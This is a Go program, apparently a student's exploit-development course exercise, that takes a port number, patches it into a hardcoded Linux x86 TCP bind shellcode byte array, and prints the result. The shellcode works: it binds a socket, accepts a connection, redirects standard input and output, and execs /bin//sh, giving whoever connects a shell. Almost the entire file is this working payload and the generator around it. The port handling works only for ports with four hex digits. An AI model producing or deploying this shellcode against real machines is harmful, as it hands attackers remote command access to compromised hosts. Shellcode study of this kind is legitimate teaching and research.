/*
Tool:		Linux Bind Shell(x86) Port Configurator
Author:		Mohit Suyal (@mosunit)
Student ID:	PA-16521
Blog:		https://mosunit.com
*/

package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
)

func main() {

	// Original shellcode - hardcoded with port 4444
	shellcode := []string{`\x31`, `\xc0\`, `xb0`, `\x66`, `\x31`, `\xdb`, `\xb3`, `\x01`, `\x31`, `\xc9`, `\x51`, `\x6a`, `\x01`, `\x6a`, `\x02`, `\x89`, `\xe1`, `\xcd`, `\x80`, `\x31`, `\xc9`, `\x31`, `\xd2`, `\x89`, `\xc2`, `\xb0`, `\x66`, `\xb3`, `\x02`, `\x51`, `\x66`, `\x68`, `\x11`, `\x5c`, `\x66`, `\x6a`, `\x02`, `\x89`, `\xe6`, `\x6a`, `\x10`, `\x56`, `\x52`, `\x89`, `\xe1`, `\xcd`, `\x80`, `\xb0`, `\x66`, `\xb3`, `\x04`, `\x6a`, `\x02`, `\x52`, `\x89`, `\xe1`, `\xcd`, `\x80`, `\xb0`, `\x66`, `\xb3`, `\x05`, `\x31`, `\xc9`, `\x51`, `\x51`, `\x52`, `\x89`, `\xe1`, `\xcd`, `\x80`, `\x50`, `\xb0`, `\x3f`, `\x5b`, `\x31`, `\xc9`, `\xcd`, `\x80`, `\xb0`, `\x3f`, `\xb1`, `\x01`, `\xcd`, `\x80`, `\xb0`, `\x3f`, `\xb1`, `\x02`, `\xcd`, `\x80`, `\xb0`, `\x0b`, `\x31`, `\xdb`, `\x53`, `\x68`, `\x6e`, `\x2f`, `\x73`, `\x68`, `\x68`, `\x2f`, `\x2f`, `\x62`, `\x69`, `\x89`, `\xe3`, `\x31`, `\xc9`, `\x31`, `\xd2`, `\xcd`, `\x80`}

	//Define flag for input
	port := flag.Int("port", -1, "port number for shellcode")
	flag.Parse()

	if *port == -1 {
		fmt.Println("Please input the port number. e.g. 9999 ")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Convert the inpurt port in hex format
	hexport := fmt.Sprintf("%x", *port)

	// Create a slice of strings to split the port into two parts
	one := make([]string, 4)
	two := make([]string, 4)

	// Create two seperate string slice to store first two and last two characters of the port converted in hex
	for i, r := range hexport {
		if i < 2 {
			one[i] = string(r)
			continue
		}
		two[i] = string(r)
	}

	// Join the string of ports to create two equal parts
	p1 := strings.Join(one[:], "")
	p2 := strings.Join(two[:], "")

	// Change the representation of the ports to hex format
	p1 = fmt.Sprintf("%s%s", "\\x", p1)
	p2 = fmt.Sprintf("%s%s", "\\x", p2)

	// Replace the respective values of port in orginal shellcode to new port provided
	shellcode[32] = p1
	shellcode[33] = p2

	// Join the slice of strings and print the shellcode
	fmt.Printf("Generating TCP bind shellcode for port number %v\nThe shellcode length is %v bytes\n\n\"%s\"", *port, len(shellcode), strings.Join(shellcode[:], ""))

}
